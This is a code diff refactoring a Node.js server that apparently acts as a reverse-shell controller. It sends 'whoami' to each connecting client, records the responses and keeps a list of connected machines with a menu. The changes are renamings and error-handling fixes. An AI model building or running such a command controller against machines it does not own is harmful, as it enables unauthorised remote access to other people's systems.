@@ -8,7 +8,7 @@ const server = net.createServer((client) => {
         switch (error.code) {
             case "ECONNRESET":
                 console.log("\[-] Client disconnected!");
-                manageServer.getClientCount(server);
+                manageServer.getNumberOfClients(server);
                 break;
             default:
                 break;
@@ -30,33 +30,31 @@ server.on("connection", (client) => {
     // Response is saved by "data" event since it's the first request.
     client.write("whoami");
 
-    manageServer.getClientCount(server);
-    manageServer.mainMenu();
+    manageServer.getNumberOfClients(server);
+    manageServer.gotoMainMenu();
 
     client.on("data", async (data) =>  {
         try {
-            const currentClient = await manageServer.getClientConnection(client);
+            const currentClient = await manageServer.getClientData(client);
             // Prevent newline being added to shell prompt.
             const clientResponse = data.toString().replace("\n", "");
             currentClient.responseHistory.push(clientResponse);
             currentClient.messageCount++;
-            const SECOND_MESSAGE = 1;
-            // Save the `whoami` response in the current client's profile.
-            if (currentClient.messageCount <= SECOND_MESSAGE) {
-               setClientName(currentClient, clientResponse);
+            if (currentClient.messageCount <= 1) {
+                setClientName(currentClient, clientResponse);
 
                 return;
             } else {
                 console.log(clientResponse);
             }
-        } catch {
-            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`);
+        } catch (err) {
+            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`,err);
         }
     });
 });
 
 const saveNewClient = (client) => {
-    const fullClientAddress = `${clientAddress}:${clientPort}`;
+    const fullClientAddress = `${client.remoteAddress}:${client.remotePort}`;
     console.log(`[+] Connection receieved: ${fullClientAddress}`);
     socketClients.push({ address : `${fullClientAddress}`, client, messageCount : 0, name: "", responseHistory : [], uptime: 0 });    
 }
